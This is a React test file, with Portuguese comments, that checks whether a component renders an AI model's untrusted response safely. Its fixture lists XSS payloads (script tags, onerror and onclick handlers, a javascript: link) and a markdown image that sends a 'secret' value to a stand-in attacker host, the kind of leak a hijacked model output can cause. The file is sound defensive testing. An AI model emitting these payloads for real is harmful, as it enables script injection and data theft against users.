import { render } from "@testing-library/react";
import { describe, expect, it } from "vitest";

import { RespostaDoModelo } from "./RespostaDoModelo";

/** A resposta do modelo é tratada como não confiável (N3): vira texto e
 * marcação simples, nunca código. */
const MALICIOSA = [
  "<script>alert('XSS')</script>",
  "<img src=x onerror=\"alert('XSS')\">",
  "[clique](javascript:alert('XSS'))",
  "![rastreio](https://atacante.example/pixel.png?dado=segredo)",
  "<a href=\"https://atacante.example\" onclick=\"roubar()\">link</a>",
  "[documentação](https://exemplo.example/doc)",
].join("\n\n");

const montar = () => render(<RespostaDoModelo texto={MALICIOSA} />).container;

describe("RespostaDoModelo com resposta maliciosa", () => {
  it("HTML do modelo não vira elemento: script e eventos ficam como texto", () => {
    const container = montar();
    expect(container.querySelector("script")).toBeNull();
    expect(container.querySelector("[onerror], [onclick]")).toBeNull();
    expect(container.textContent).toContain("<script>alert('XSS')</script>");
  });

  it("link javascript: perde o destino", () => {
    const link = [...montar().querySelectorAll("a")].find((a) => a.textContent === "clique");
    expect(link?.getAttribute("href") ?? "").not.toMatch(/javascript:/i);
  });

  it("imagem do modelo não é carregada", () => {
    const container = montar();
    expect(container.querySelector("img")).toBeNull();
    expect(container.textContent).toContain("[imagem removida: rastreio]");
  });

  it("link para fora abre sem levar a página de origem", () => {
    const link = [...montar().querySelectorAll("a")].find((a) => a.textContent === "documentação");
    expect(link?.getAttribute("rel")).toBe("noopener noreferrer nofollow");
    expect(link?.getAttribute("target")).toBe("_blank");
  });
});
